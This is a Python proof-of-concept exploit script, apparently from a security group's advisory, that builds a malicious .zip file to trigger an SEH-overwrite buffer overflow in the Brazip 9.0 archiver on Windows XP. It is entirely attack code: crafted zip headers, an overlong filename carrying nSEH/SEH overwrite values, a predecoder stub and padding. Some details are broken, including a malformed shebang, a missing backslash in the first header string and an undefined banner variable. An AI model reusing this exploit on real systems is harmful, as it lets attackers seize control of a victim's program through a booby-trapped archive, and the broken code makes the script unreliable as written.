#!user/bin/python
######################################################################
# Brazip 9.0 (.zip File) BoF Poc (SEH) 
# Homepage  : www.brazip.com.br
# Version   : 9.0
# Tested Os : Windows XP SP1/SP3 EN 
# Usage     : $ Python Brazip-poc.py
######################################################################
#AUTHOR: ITSecTeam
#Email: Bug@ITSecTeam.com
#Website: http://www.itsecteam.com
#Forum : http://forum.ITSecTeam.com
#Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability60.htm
#Thanks: Hoshang jafari  aka [PLATEN]
######################################################################
import sys
print __banner__

header_1 =("x50\x4B\x03\x04\x14\x00\x00"
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" 
"\x00\x00\x00\x00\x00\x00\x00\x00" 
"\xe4\x0f" 
"\x00\x00\x00")
 
header_2 = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" 
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")
 
header_3 = ("\x50\x4B\x05\x06\x00\x00\x00"
"\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"
"\x02\x10\x00\x00"
"\x00\x00")
nseh="\x41\x41\x41\x41"  
seh="\x65\x47\x7e\x6d"   

payload = "A" * 297 + nseh  + seh

predecoder = "\x59\x59\x59\x51\x5c"
payload=payload+predecoder
filltoebx="B" * (100-len(predecoder))
rest = "C" *  (4064-len(payload+filltoebx)) + ".txt"
payload = payload+filltoebx+rest
exploit = header_1 + payload + header_2 + payload + header_3
 
try:
	f=open("Brazip-poc.zip",'w')
	f.write(exploit)
	f.close()
	print   "[+] File created successfully !" 
	sys.exit(0)
except:
	print "[-] Error cant write file to system\n"